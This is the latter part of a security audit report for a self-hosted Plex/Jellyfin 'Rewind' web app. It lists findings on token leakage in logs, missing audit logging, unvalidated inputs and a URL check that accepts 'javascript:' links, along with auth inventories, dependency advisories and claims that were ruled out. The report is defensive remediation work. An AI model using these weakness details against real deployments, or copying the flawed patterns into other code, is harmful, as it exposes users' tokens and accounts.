  - Set `poweredByHeader: false`, remove `X-XSS-Protection` (or set it to `0`), and use `strict-origin-when-cross-origin`.
  - Make HSTS configurable: default `max-age=31536000`, with no preload unless the operator opts in.
  - A nonce CSP in `proxy.ts` forces every page to render dynamically, so weigh that cost first. Keep `style-src 'unsafe-inline'`, which Framer Motion needs.
- **Effort:** M

#### SEC-54: Logs capture share tokens, OAuth codes, PIN IDs, invite codes and raw client IPs; `Error` metadata is logged as `{}`

- **Severity:** Low
- **Status:** adjusted
- **Sources:** WEB-13, SEC-INFRA-08, AUTH-15 (logging part)
- **Where:** `proxy.ts:28`, `:31-44`, `:63`, `:69`; `lib/utils/logger.ts:103-115`, `:122-162`, `:183-188`, `:213-215`, `:234`, `:575-590`; `lib/discord/integration.ts:78`
- **Evidence:**
  - **What `proxy.ts` logs:** every request at info level, with `method, url, userAgent, ip, pathname, searchParams: Object.fromEntries(request.nextUrl.searchParams)`.
  - **The matcher covers `/api`:** contrary to its own comment (`:63`).
  - **Gaps in redaction:**
    - `sanitizeUrl` redacts only `["token", "apiKey", "key", "auth", "password", "secret", "apikey"]`, case-sensitively;
    - `sanitizeValue` redacts by key substring, or strings longer than 32 characters made only of `[A-Za-z0-9_-]`;
    - message strings are never sanitised.
  - **Tested in production mode:** a Plex token inside a URL, a share-token path, and an `apikey=` inside a message all printed in clear. `{ error: new Error(...) }` printed as `"error":{}`.
- **Impact:** share tokens, invite codes, Discord OAuth `code`/`state`, `plexPinId` and full client IPs end up in logs. That contradicts the decision to store only hashed IPs for share visits. About 21 to 27 `{ error }` call sites lose all diagnostics in production.
- **Verifier corrections:** log access is operator-level in a self-hosted app. A 43-character share token in `?share=` is redacted by the heuristic, but it leaks via `url` and `pathname`. The Plex-token URL in `server-info.ts:55-57` is logged only at debug level. `logger.error()` serialises Errors correctly.
- **Recommendation:**
  - Stop logging `searchParams` and raw IPs: hash the IP or drop it, and log an allowlist of query keys.
  - Mask the bearer segment of `/wrapped/share/*` and `/invite/*` paths.
  - Extend `sanitizeUrl`, case-insensitively, to `x-plex-token`, `share`, `code`, `state`, `plexPinId` and `inviteCode`.
  - Serialise `Error` values in metadata as `{ name, message, code }`, and fix the matcher comment.
- **Effort:** M

#### SEC-55: Credential and config changes are not audit-logged; the audit log goes to stdout only

- **Severity:** Low
- **Status:** confirmed
- **Sources:** SEC-INFRA-15, AI-05 (prompt-template audit and atomic activation)
- **Where:** `lib/security/audit-log.ts:10`, `:88-99`; `actions/admin/admin-servers.ts:71`; `actions/admin/admin-llm-providers.ts:83`; `actions/admin/admin-config.ts:377`, `:454`; `actions/setup.ts`; `actions/prompts.ts:70-76`, `:120-125`, `:202-212`; `actions/discord.ts:117`
- **Evidence:**
  - **Stdout only:** `audit-log.ts:88-99` only calls `auditLogger.info(...)`, alongside `// TODO: In production, write to: - Database audit log table ... Immutable log storage`.
  - **Never emitted:** `CONFIG_CHANGED` is not emitted anywhere in production code.
  - **Missing from the riskiest actions:** there are zero `logAuditEvent` calls in `admin-servers.ts`, `admin-llm-providers.ts`, `admin-config.ts` (Stripe settings and toggle), `setup.ts` or the prompt-template CRUD. Discord config (`discord.ts:117`) is the exception.
  - **Non-atomic activation:** prompt activation is `updateMany(... isActive: false)` followed by `update(... isActive: true)`, with no `$transaction`.
- **Impact:** the most sensitive operations leave no forensic trail: repointing Plex, rotating the Stripe key, exfiltration via SEC-31, and template edits that change every user's Rewind. Audit events are lost with container log rotation, and concurrent activations can leave zero or two active templates.
- **Recommendation:**
  - Emit `CONFIG_CHANGED` with a redacted diff (field names, a `secretChanged` boolean, old and new URL origins) from every settings, setup and template mutation.
  - Persist events to an append-only `AuditLog` table with retention, and expose it read-only in admin.
  - Wrap template activation in `$transaction`.
- **Effort:** M

#### SEC-56: Invites, route handlers and public actions skip Zod validation, against the CLAUDE.md rule, and interpolate parameters unencoded

- **Severity:** Low
- **Status:** adjusted
- **Sources:** WEB-16, AUTH-16 (validation part)
- **Where:** `actions/invite.ts:394-445`, `:411`, `:429`, `:531`, `:786-798`; `app/api/wrapped/share/[token]/route.ts:23`; `app/api/wrapped/og-image/route.tsx:43`; `app/api/admin/playground/statistics/route.ts:28-33`; `app/api/admin/wrapped/by-user/[userId]/route.ts:25-26`; `app/(app)/discord/connect/route.ts:33`; `lib/plex-auth.ts:128-131`
- **Evidence:**
  - **No Zod anywhere under `app/api`:** no route handler imports zod or calls `safeParse`.
  - **`createInvite` has no schema:** it accepts `options.code?.trim().toUpperCase()` of any length or charset, and `maxUses: options.maxUses || 1`.
  - **Ad hoc checks:** `processJellyfinInvite` checks `username.length < 3` and `password.length < 8`, with no charset or maximum.
  - **Unencoded parameter:** `createPlexAuthUrl` appends ``forwardUrl += `&inviteCode=${inviteCode}` ``.
- **Impact:** inconsistent validation that is hard to audit. Short custom codes are guessable (SEC-24), and unbounded usernames and passwords are forwarded to Jellyfin.
- **Verifier corrections:** the cited handlers do validate by hand (year range, `validateYear`, `RATING_KEY_PATTERN`, `sanitizeRedirectPath`), and share-token lookups are parameterised. The `&` injection is only reachable through an admin-chosen custom code. A fractional `maxUses` makes Prisma throw, a negative one creates an unusable invite, and all of these inputs are admin-only.
- **Recommendation:**
  - Add shared Zod param schemas: share token (base64url, length 43), `ratingKey` (`/^\d{1,12}$/`), year and cuid IDs. Use them in route handlers and public actions.
  - `createInvite` schema: custom code `/^[A-Z2-9]{6,32}$/`, `maxUses` an integer from 1 to 1000, `expiresIn` an enum.
  - `processJellyfinInvite` schema: username charset, length 3 to 32; password length 8 to 256.
  - Build `forwardUrl` with `URL` and `searchParams.set`.
- **Effort:** S

#### SEC-57: The public URL schema accepts any URL scheme for links shown to users

- **Severity:** Low
- **Status:** confirmed
- **Sources:** WEB-14
- **Where:** `lib/validations/shared-schemas.ts:95-112`; `app/(app)/page.tsx:45`; `components/dashboard/requests-card.tsx:12`; `components/auth/jellyfin-sign-in-form.tsx:113`
- **Evidence:**
  - **The check:** `createPublicUrlSchema` validates only with `try { new URL(url); return true }`, which accepts `javascript:` and `data:`.
  - **Where it is rendered:** `href={overseerrUrl}` and `href={jellyfinUrl}`.
  - **Inconsistent with the server schema:** `createServerUrlSchema` enforces http/https.
- **Impact:** only an admin can set the value, and React 19.2 neutralises `javascript:` hrefs, so this is defence in depth.
- **Recommendation:** require http/https in `createPublicUrlSchema` by reusing `parseServerUrl`.
- **Effort:** S

## Strengths to preserve

**Admin authorization**
- Every admin server action calls `requireAdmin()` itself, and every `app/api/admin/**` route calls `requireAdminAPI()` after `adminRateLimiter`. No admin page relies only on `app/admin/layout.tsx`.
- Admin queue actions Zod-validate the job id, rate-limit per admin and write audit events (`actions/admin/queue.ts:322-406`).

**User-scoped actions**
- User-scoped actions take the user id from the session, never from the client: user-marks, watchlist, onboarding, subscription and Discord disconnect/resync.
- `deleteUserMediaMark` checks ownership, and `getUserPlexWrapped` enforces owner-or-admin (`actions/user-queries.ts:35-45`).
- `generatePlexWrapped` validates input with Zod and applies the own-vs-admin rules for create and regenerate.

**Tokens and codes**
- Invite redemption is atomic: a Serializable transaction, P2034 retry with backoff, a compensating rollback and audit events.
- Generated invite codes use `crypto.randomInt` with an unambiguous alphabet (about 40 bits).
- Share tokens are 256-bit `randomBytes(32)` base64url values.
- Missing and incomplete wraps return the same 404, and the share and OG routes are rate-limited.
- Share visits store a salted SHA-256 hash of the IP, never the raw IP.

**Poster proxy**
- It keeps the Plex token server-side in a header and validates `ratingKey` against `/^\d{1,12}$/`.
- It fetches a fixed thumb path, and limits share-token access to rating keys inside that wrapped.

**Sessions and test/dev paths**
- The NextAuth jwt callback re-reads `isAdmin` from the DB every 5 minutes or on `session.update()`, caps `maxAge` at 7 days, and never merges session data sent by the client.
- The test-auth bypass and dev defaults are gated on `NODE_ENV`, which standalone `server.js` forces to `production`, and the seed refuses to run in production.

**Stripe**
- The webhook verifies the signature against the raw body before parsing, dedupes on `event.id`, enqueues only the id and re-fetches from Stripe.
- `startCheckout` validates `priceId` against the offered prices, and both self-service actions are rate-limited per user.
- Checkout and portal return URLs are built only from the server base URL.
- FR-29 (no Plex side effects while Stripe is disabled) and the FR-19 revoke-guard ordering are implemented as a pure, testable function.

**Discord**
- OAuth state is 192-bit random, single-use, has a 10-minute TTL and is capped per user, and the connect route is rate-limited. `discordUserId` and `userId` are unique on `DiscordConnection`.
- `scrubForDiscord` is allowlist-based and fails closed. The Discord-safe tool set is derived from metadata, and admin-only tools are enforced server-side with audited refusals.
- The bot enforces entitlement at the `handleDiscordChat` chokepoint and in the slash and component routers.
- Chat sessions persist with Serializable transactions and conflict retry.

**Secrets at rest**
- `lib/security/crypto.ts` uses AES-256-GCM with a fresh 96-bit IV and a 16-byte tag, has a versioned `enc:v1:` prefix and fails closed on tampering.
- A single Prisma extension covers every credential column, including `createMany`, `upsert` and `{ set }`.
- Admin settings strip secrets and expose only `has*` booleans, with a regression test (`actions/__tests__/admin-settings-secret-hiding.test.ts`).
- BullMQ payloads carry only ids, so no secrets sit in Redis.

**Rendering and injection hygiene**
- There is no `dangerouslySetInnerHTML` and no raw SQL (`$queryRaw` / `$executeRaw` / `$queryRawUnsafe`) anywhere.
- react-markdown v10 runs without `rehype-raw`.
- The LLM's `<highlight>` markup becomes React text nodes.
- LLM tool arguments are type-checked or encoded before they reach outbound URLs.
- LLM Rewind output is schema-enforced (strict `json_schema` where supported) and always Zod-validated, with archetype names fixed in code.

**Build and deployment**
- The Docker runtime runs as non-root uid 1001, is multi-stage, passes no secrets as build args, and `.dockerignore` excludes `.env` files.
- A regex scan of tracked files and git history found no committed secrets.
- `claude-code-review.yml` uses `pull_request` (not `pull_request_target`).
- API routes use `createSafeError`, which returns stack traces only in development.

**Platform defaults**
- The Next 16 image optimizer's private-IP guard is on, with `dangerouslyAllowLocalIP` unset.
- NextAuth uses its default same-origin redirect callback.

## Metrics and inventories

### Auth entry points (sec-authz)

`proxy.ts` only logs requests and sets a request ID: it performs no auth checks, and it logs every query parameter. `next.config.js` `images.remotePatterns` allows any host over http and https.

**Route handlers (15).** 13 of the 15 call a rate limiter; the two that don't are NextAuth and the Discord callback. `authRateLimiter` is defined but never used.

| Route | Check | Verdict |
|---|---|---|
| `/api/auth/[...nextauth]` GET, POST | NextAuth credentials (plex, jellyfin) and CSRF token | WEAK: no rate limit, Jellyfin ignores `enabledForLogin`, email linking (SEC-08, SEC-14, SEC-24) |
| `/api/admin/models` GET | adminRateLimiter and requireAdminAPI | OK |
| `/api/admin/playground/statistics` GET | requireAdminAPI | OK |
| `/api/admin/plex/users` GET | requireAdminAPI | OK |
| `/api/admin/radarr` GET | requireAdminAPI | OK |
| `/api/admin/sonarr` GET | requireAdminAPI | OK |
| `/api/admin/wrapped/[wrappedId]/user` GET | requireAdminAPI | OK |
| `/api/admin/wrapped/[wrappedId]/versions` GET | requireAdminAPI, plus requireAdmin in the action | OK |
| `/api/admin/wrapped/by-user/[userId]` GET | requireAdminAPI | OK |
| `/api/discord/callback` GET | DB state lookup, no session binding | WEAK (SEC-13) |
| `/discord/connect` GET (route handler in `(app)`) | Session only; the layout gate does not apply | WEAK (SEC-13, SEC-28) |
| `/api/stripe/webhook` POST | Stripe signature on raw body, plus dedupe | OK |
| `/api/wrapped/share/[token]` GET | 256-bit token and rate limit | OK for auth; leaks data (SEC-16) |
| `/api/wrapped/og-image` GET | Share token and rate limit | OK (email fallback, SEC-16) |
| `/api/wrapped/poster/[ratingKey]` GET | Any session, or a share token covering the key | OK (gated users pass, SEC-28; caching, SEC-21) |

**`'use server'` exports (34 files, 139 exports; 3 of the modules are under `lib/`: `plex-auth`, `jellyfin-auth` and `guards`)**

| Group | Check | Verdict |
|---|---|---|
| `actions/admin/*` (10 files, about 45 exports) | requireAdmin in every export | OK |
| discord-activity (15), share-analytics (3), prompt CRUD (6), import-plex-users, admin user-queries, invite create/get/delete, updateDiscordIntegrationSettings, generateAllPlexWrapped | requireAdmin or session.isAdmin | OK |
| announcements admin CRUD, chatWithAdminBot, savePlaygroundWrapped, testPromptTemplate, getAvailableLibraries | session.user.isAdmin | OK |
| `setup.ts` save* (x9) and completeSetup | requireAdminIfSetupComplete | WEAK before setup completes (SEC-30) |
| `setup.fetchLLMModels` | none | WEAK (SEC-19) |
| getSetupStatus, getServerName, getActiveAnnouncements, getWrappedSettings, isSubscriptionGatingEnabled, ensureSetupComplete, ensureOnboardingComplete | none (public by design) | OK |
| getActivePromptTemplate, `guards.getAccessGateStatus(userId)`, validateInvite, `onboarding.getOnboardingInfo`, `auth.checkServerAccess` | none | WEAK (SEC-19) |
| `dev-defaults.getDevDefaults` | `NODE_ENV === 'development'` only | WEAK (SEC-15) |
| `invite.processInvite` / `processJellyfinInvite` | invite code only | WEAK (SEC-08, SEC-29, SEC-24) |
| `plex-auth` createPlexPin / getPlexAuthToken / verifyPlexAuthToken / createPlexAuthUrl | none (pre-login by design) | WEAK (SEC-11) |
| `jellyfin-auth` authenticateJellyfin / isJellyfinAdmin | none; caller supplies `{ url, apiKey }` | NONE (SEC-35) |
| onboarding get/complete, startCheckout, openBillingPortal, user-marks (x3), watchlist (x4), Discord disconnect/resync, getPrometheusStatus | session only, no entitlement check | WEAK for gated users (SEC-28); watchlist (SEC-27) |
| generatePlexWrapped | session plus own/admin rules | WEAK: no rate limit or lock (SEC-22) |
| getUserPlexWrapped | session plus owner-or-admin | OK |
| getUserFirstWatchDate | session only; takes any plexUserId/email | WEAK, IDOR (SEC-19) |
| `guards.ensureSubscriptionOrAccess` | session | OK |

**Pages (32)**
- `app/admin/**`: guarded by the requireAdmin layout, and every page loads data through requireAdmin actions (3 pages also call requireAdmin directly). OK.
- `app/(app)/**`: `ensureSetupComplete`, `ensureOnboardingComplete` and `ensureSubscriptionOrAccess` run in the layout only. WEAK (SEC-28).
- `setup/page`: open until setup completes.
- `invite/[code]`: public.
- `onboarding` and `subscribe`: check the session.

**Session parameters**
- `isAdmin` is re-read every 5 minutes (`ADMIN_RECHECK_INTERVAL_MS`).
- `maxAge` is 7 days, and the session rolls via `/api/auth/session`.
- Invite codes are 8 characters from a 32-symbol alphabet, about 2^40 combinations.

### Web layer counts (sec-web)

| Metric | Value |
|---|---|
| Route handlers calling a rate limiter | 13 of 15 |
| Zod / safeParse calls in `app/api` route handlers | 0 |
| `'use server'` modules (under `lib/`) | 34 (3) |
| Raw SQL queries | 0 |
| `dangerouslySetInnerHTML` | 0 |
| Outbound URLs with secrets in the query string | 31 (about 20 Tautulli `apikey=`, about 11 Plex `X-Plex-Token=`) |
| Fetch calls with `redirect: 'manual'` | 0 |
| Bare `fetch(` without timeout | tautulli.ts 13, overseerr.ts 9, plex-invitations.ts 4 |
| `next/image` usages (optimized) | 8 (2: user-table-row.tsx:76, invite-details-client.tsx:273) |

### ENCRYPTED_FIELDS coverage (`lib/prisma.ts:23-35` vs `prisma/schema.prisma`)

| Column | Encrypted |
|---|---|
| User.plexAuthToken (21) | yes |
| PlexServer.token (64) | yes |
| JellyfinServer.apiKey (79) | yes |
| Tautulli.apiKey (95) | yes |
| Overseerr.apiKey (108) | yes |
| Sonarr.apiKey (121) | yes |
| Radarr.apiKey (134) | yes |
| LLMProvider.apiKey (158) | yes |
| DiscordIntegration.clientSecret (274), botToken (275) | yes |
| DiscordConnection.accessToken (310), refreshToken (311) | yes |
| Config.stripeSecretKey (261), stripeWebhookSecret (262) | yes |
| Prometheus | no credential column (authenticated Prometheus is unsupported) |
| PlexWrapped.shareToken (180), a bearer value looked up by equality | no |
| Invite.code, a bearer value | no |
| DiscordOAuthState.state / codeVerifier (short-lived PKCE values) | no |
| LLMUsage.prompt / response (236-237), full viewing history | no |
| DiscordChatSession.messages | no |
| WrappedShareVisit.ipAddress | hashed (`sha256(ip + NEXTAUTH_SECRET)`); userAgent and referer stored raw |
| DiscordIntegration.clientId | no (public id) |

Caveat: every "yes" applies only when `ENCRYPTION_KEY` is set (it is unset by default, SEC-33), and only for top-level queries. Nested `include`/`select` reads skip the extension (SEC-18). `isEncryptionConfigured()` has 0 call sites.

### Dependencies

| Scope | Vulnerabilities |
|---|---|
| `npm audit --omit=dev` (337 prod deps) | 30 (2 critical, 17 high, 11 moderate) |
| `npm audit` (all) | 75 (2 critical, 56 high, 15 moderate, 2 low) |
| `next@16.1.1` | 38 advisories (fixed in >= 16.3.8) |
| `next-auth@4.24.x` | 3 advisories (fixed in 4.24.15; none reachable) |

Every production advisory has a fix without a major version bump; some dev-tree fixes are semver-major.

| Package | Installed | Latest / note |
|---|---|---|
| next | 16.1.1 | 16.4.2 |
| next-auth | 4.24.13 | 4.24.15 (v5 is still 5.0.0-beta.32) |
| discord.js | 14.25.1 | 14.27.0 |
| sharp | 0.34.5 (bundled libheif 1.20.2) | 0.35.5 |
| undici (via discord.js) | 6.21.3 | 15 advisories |
| ws | 8.18.3 | GHSA-96hv-2xvq-fx4p |
| qs | 6.14.1 | 6.16.1 |
| uuid (via next-auth / bullmq) | 8.3.2 / 11.1.0 | GHSA-w5hq-g745-h8pq |
| lodash | 4.17.21 | GHSA-r5fr-rjxr-66jc |
| hono (via prisma / @prisma/dev) | 4.10.6 | about 40 advisories |
| ts-node | 10.9.2 | no release since 2023-12-08 |
| Docker base | node:25.8-alpine | Node 25 reached end-of-life on 2026-06-01; CI uses Node 22 |

Raw audit output (scratch, read-only reference):
- `/tmp/claude-0/-home-user-plex-manager/cdf00aef-60a5-5421-b8fe-3ff52314b6a2/scratchpad/secrets-infra/npm-audit-prod.json`
- `/tmp/claude-0/-home-user-plex-manager/cdf00aef-60a5-5421-b8fe-3ff52314b6a2/scratchpad/secrets-infra/npm-audit-all.json`
- Logger redaction test: `/tmp/claude-0/-home-user-plex-manager/cdf00aef-60a5-5421-b8fe-3ff52314b6a2/scratchpad/secrets-infra/logtest.ts`

### Error handling, logging and audit counts

| Metric | Value |
|---|---|
| Logger calls passing raw `Error` objects as metadata (logged as `{}`) | 21 (verifier counted about 27 info/warn/debug sites) |
| `error instanceof Error ? error.message` in `actions/` | about 40 to 45 sites |
| `lib/connections` sites embedding `${error.message}` in returned strings | 49 to 51 |
| Audit events for service-credential or Stripe-key changes | 0 |
| `CONFIG_CHANGED` emitted in production code | 0 |
| `createSafeError` callers outside `app/api` | 0 |

### AI, Discord, Stripe and queue scope (sec-ai-integrations)

The auditor reviewed about 65 files (about 18k LOC) in:

- **Chatbot:** `actions/chatbot/**` and `lib/chatbot`.
- **Discord:** `lib/discord/**` (commands, routing, lock, media, integration), `app/api/discord/callback` and `app/(app)/discord/connect`.
- **Wrapped/Rewind:** `lib/wrapped` (the LLM path), `actions/wrapped-generation.ts`, `actions/prompts.ts`, `actions/prompt-test.ts` and `actions/playground-wrapped.ts`.
- **LLM:** `lib/llm/*`.
- **Stripe:** `lib/stripe/*`, `app/api/stripe/webhook`, `actions/subscription.ts` and `actions/admin/subscriptions.ts`.
- **Queue:** `lib/queue/**` and `actions/admin/queue.ts`.
- **Watchlist:** `lib/watchlist/*` and `actions/watchlist.ts`.
- **Shared:** `lib/security/rate-limit.ts` and `components/admin/chatbot/chat-window.tsx`.

That auditor filed 22 findings (3 high, 13 medium, 5 low, 1 info as filed). It ran no tooling beyond grep and node one-liners, which confirmed the URL backslash parsing and the `String.replace` `$`-pattern behaviour.

**Relevant constants for planning Rewind 2026:**
- Chatbot `MAX_LOOPS` = 5.
- Chat LLM timeout 30 s; Rewind LLM timeout 300 s.
- BullMQ worker concurrency 5; job attempts 3 (5 s then 10 s backoff); failed jobs kept for 7 days.
- Discord OAuth `STATE_TTL_MS` 10 minutes.
- Year schema 2010 to 2100.

## Appendix: Investigated and ruled out

No finding was refuted outright. These specific claims were checked and ruled out, or corrected, during verification:

**Image optimizer and SSRF**
- **AVIF RCE (GHSA-2xp9) reachable as locked:** not reachable. The bundled libheif is 1.20.2, outside the affected 1.22.0 to 1.23.1 range; severity is disputed in SEC-01.
- **`/_next/image` as direct internal SSRF:** ruled out. Next 16 blocks private IPs by default; only the DNS-rebinding TOCTOU remains (SEC-01).
- **`fetchLLMModels` as SSRF:** ruled out. It always calls a fixed OpenAI endpoint; it is a key-validity oracle (SEC-19).

**Plex PIN flow**
- **PIN id leaks through the Referer header:** ruled out by `Referrer-Policy: origin-when-cross-origin`.
- **Scanning sequential PIN ids "through the app" is a distinct capability:** ruled out. The client identifier is public by Plex's design, so the app adds only IP hiding.

**Sessions and NextAuth**
- **Admin sessions keep a stale `isAdmin` claim:** ruled out. It is re-read from the DB every 5 minutes.
- **A deleted user row is a practical issue:** ruled out. The app has no user-deletion path, so this needs manual DB edits.
- **An `else` branch in the jwt callback would stop secret-based forgery:** ruled out. A forger can use a real admin `sub` and a future `checkedAt`.
- **An explicit NextAuth `secret` is required:** ruled out. v4 reads `NEXTAUTH_SECRET` / `AUTH_SECRET` automatically and fails with `NO_SECRET` in production.
- **next-auth v4 is unsupported on Next 16:** ruled out. 4.24.13 declares `next ^16` as a peer.
- **NextAuth thrown string errors are a flaw:** ruled out. They follow the documented v4 Credentials pattern.

**Docker, compose and dev tooling**
- **The http `NEXTAUTH_URL` in docker-compose is a production risk:** ruled out. The compose file is dev-only (`plex-wrapped-dev`).
- **Missing `NODE_ENV` in the Docker runner matters:** ruled out. Standalone `server.js` hard-sets `production`.
- **npm as PID 1 breaks graceful shutdown:** ruled out. npm forwards SIGTERM/SIGINT to its child.
- **`.env.development` / `.env.test` / `data/` leak into the image:** ruled out. None exist, and builder layers are not in the final image.
- **Prisma auto-runs the seed on `migrate dev` / `migrate reset`:** ruled out for Prisma 7.2.0, which seeds only on `prisma db seed`.
- **The seed can run inside the runner container:** ruled out. Neither `seed.ts` nor ts-node is copied in.
- **`getDevDefaults` returns "every configured secret":** ruled out. It returns only DEV_* env values.
- **ts-node adds supply-chain surface "for nothing":** ruled out. The seed and the Discord scripts use it, and it is a devDependency outside the runtime image.

**Headers and logging**
- **HSTS breaks LAN http installs or sibling subdomains:** ruled out. Browsers ignore HSTS over plain HTTP, `includeSubDomains` only covers the sending host's subdomains, and `preload` needs a manual submission.
- **Missing `frame-ancestors` allows framing:** largely ruled out by `X-Frame-Options: SAMEORIGIN`.
- **The proxy's logged `url` is unsanitised:** corrected. It passes through `sanitizeUrlForLogging`, which misses only `share`, `code`, `state` and `X-Plex-Token`.

**Outbound requests and server actions**
- **Bare fetches "hang without bound":** ruled out. undici's default 300 s header and body timeouts apply.
- **`checkServerAccess` `maxRetries` is unbounded:** ruled out. Retries are capped by `MAX_RETRY_TIMEOUT_MS` (3 minutes) and run only after a valid Plex token; the uncapped `initialDelay` remains (SEC-19).
- **All 31 query-string secrets can move to headers:** ruled out. Tautulli requires `apikey` in the query, so only about 11 Plex cases can move.

**Invites**
- **Generated invite codes can be brute-forced:** ruled out. They carry about 40 bits from `crypto.randomInt`; only custom codes are weak.
- **A fractional `maxUses` creates a broken invite:** ruled out. Prisma's Int validation throws.
- **Hashing invite codes as hardening:** ruled out. It would break the admin invites list, which re-displays `invite.code`.

**Rewind and access**
- **Rewind LLM spend by never-member gated users:** ruled out. They fail at the Tautulli lookup before any LLM call, which instead triggers SEC-17.
- **`plexAuthToken` is needed only for watchlist sync:** ruled out. It is also used to auto-accept Stripe and comp invites.
- **The share email fallback triggers often:** ruled out. `name` is always set from the Plex or Jellyfin username on creation.
- **`getAccessGateStatus` as a meaningful oracle:** ruled out. It needs a non-enumerable cuid.

**Discord**
- **Discord linking gives gated users paid features:** largely ruled out. The bot enforces entitlement itself.
- **Discord callback reflects attacker text into an error banner:** ruled out. No page reads the `error`, `error_description` or `status` params.
- **The Discord privacy fail-open leaks into public channels, with user identities:** ruled out. Output goes only to DMs or an ephemeral reply, and identity fields are scrubbed.

**Stripe, Redis and queues**
- **The Stripe "unknown" rate-limit bucket:** unlikely. Next fills `x-forwarded-for` from the socket address when it is missing.
- **A Redis attacker can grant Plex access to "any account":** ruled out. The job only invites existing User rows that have an email.
- **Re-checking only "subscription ACTIVE" in the grant job:** ruled out as a fix. It would break admin comp grants, so check entitlement (ACTIVE/TRIALING or `isExempt`) instead.
- **Monthly renewal grants overwrite admin library customisations:** speculative, not shown by the code.
- **Plex is in the Stripe webhook job's failure path:** ruled out. Grant and revoke are separate jobs.
- **"Always enqueue and let the jobId dedupe" fixes resend recovery:** ruled out. BullMQ ignores a duplicate `jobId` while the failed job is retained (7 days).

**AI pipeline**
- **The quoted OpenAI tool-metadata assumption lives in `registry.ts`:** corrected. It is in `actions/chatbot/tools/types.ts:8-9`, and the risk is speculative.
- **Vercel server-action timeout numbers apply:** ruled out. The app is self-hosted; the real limit is the reverse proxy's read timeout.
